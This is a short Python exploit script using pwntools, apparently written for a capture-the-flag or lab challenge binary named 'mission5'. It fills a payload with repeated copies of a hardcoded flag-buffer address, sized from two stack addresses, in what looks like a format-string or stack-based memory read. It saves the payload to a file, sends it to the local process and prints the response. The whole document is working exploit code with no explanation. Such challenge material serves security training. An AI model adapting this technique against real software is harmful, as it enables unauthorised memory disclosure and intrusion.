from pwn import *


string_address = 0xffffca74
fstring_add = 0xffffcaa8
flag_add = 0x804a060

exploit = ""

for i in range(int((fstring_add - string_address)/4) + 0x10):
	exploit += p32(flag_add)

p = process("./mission5")

with open("writable/exploit.bin","wb") as f:
	f.write(exploit)

p.send(exploit)

print(p.recvall())
